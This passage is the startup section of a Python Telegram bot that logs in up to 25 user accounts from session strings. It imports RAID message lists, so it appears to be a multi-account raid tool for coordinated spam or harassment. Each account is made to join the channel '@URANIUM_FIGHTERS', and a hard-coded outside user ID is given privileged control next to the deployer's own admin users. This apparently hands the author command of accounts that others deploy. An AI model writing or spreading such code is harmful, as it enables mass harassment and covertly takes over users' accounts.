import os

import sys

import random

from datetime import datetime

from os import execl

from telethon import TelegramClient, events

from telethon.sessions import StringSession

from telethon.tl.functions.account import UpdateProfileRequest

from Config import STRING, SUDO_USERS, BIO_MESSAGE, API_ID, API_HASH, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, STRING11, STRING12 , STRING13 , STRING14 , STRING15 ,STRING16 , STRING17 , STRING18 , STRING19 , STRING20 , STRING21 , STRING22 , STRING23 , STRING24 , STRING25 

import asyncio

import telethon.utils

from telethon.tl import functions

from telethon.tl.functions.channels import LeaveChannelRequest

from telethon.tl.functions.messages import ImportChatInviteRequest

from Utils import RAID, RRAID

from telethon.tl.functions.channels import JoinChannelRequest

a = API_ID

b = API_HASH

smex = STRING

smexx = STRING2

smexxx = STRING3

smexxxx = STRING4

smexxxxx = STRING5

sixth = STRING6

seven = STRING7

eight = STRING8

ninth = STRING9

tenth = STRING10

eleve = STRING11

twelv = STRING12

thirt = STRING13

forte = STRING14

fifth = STRING15

sieee = STRING16

seeee = STRING17

eieee = STRING18

nieee = STRING19

gandu = STRING20

ekish = STRING21

baish = STRING22

teish = STRING23

tfour = STRING24

tfive = STRING25

idk = ""

ydk = ""

wdk = ""

sdk = ""

hdk = ""

adk = ""

bdk = ""

cdk = ""

edk = ""

ddk = ""

vkk = ""

kkk = ""

lkk = ""

mkk = ""

sid = ""

shy = ""

aan = ""

ake = ""

eel = ""

khu = ""

shi = ""

yaa = ""

dav = ""

raj = ""

put = ""

que = {}

SMEX_USERS = [5267349380]

for x in SUDO_USERS: 

    SMEX_USERS.append(x)

    

async def start_yukki():

    global idk

    global ydk

    global wdk

    global sdk

    global hdk

    global adk

    global bdk

    global cdk

    global ddk

    global edk

    global vkk

    global kkk

    global lkk

    global mkk

    global sid

    global shy

    global aan

    global ake

    global eel

    global khu

    global shi

    global yaa

    global dav

    global raj

    global put

    

    if smex:

        session_name = str(smex)

        print("String 1 Found")

        idk = TelegramClient(StringSession(session_name), a, b)

        try:

            print("Booting Up The Client 1")

            await idk.start()

            botme = await idk.get_me()

            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            await idk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            botid = telethon.utils.get_peer_id(botme)

            SMEX_USERS.append(botid)

        except Exception as e:

            idk = "smex"

            print(e)

            pass

    else:

        print("Session 1 not Found")

        session_name = "startup"

        idk = TelegramClient(session_name, a, b)

        try:

            await idk.start()

        except Exception as e:

            pass

   

    if smexx:

        session_name = str(smexx)

        print("String 2 Found")

        ydk = TelegramClient(StringSession(session_name), a, b)

        try:

            print("Booting Up The Client 2")

            await ydk.start()

            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            await ydk(functions.channels.JoinChannelRequest(channel=" @URANIUM_FIGHTERS"))

            botme = await ydk.get_me()

            botid = telethon.utils.get_peer_id(botme)

            SMEX_USERS.append(botid)

        except Exception as e:
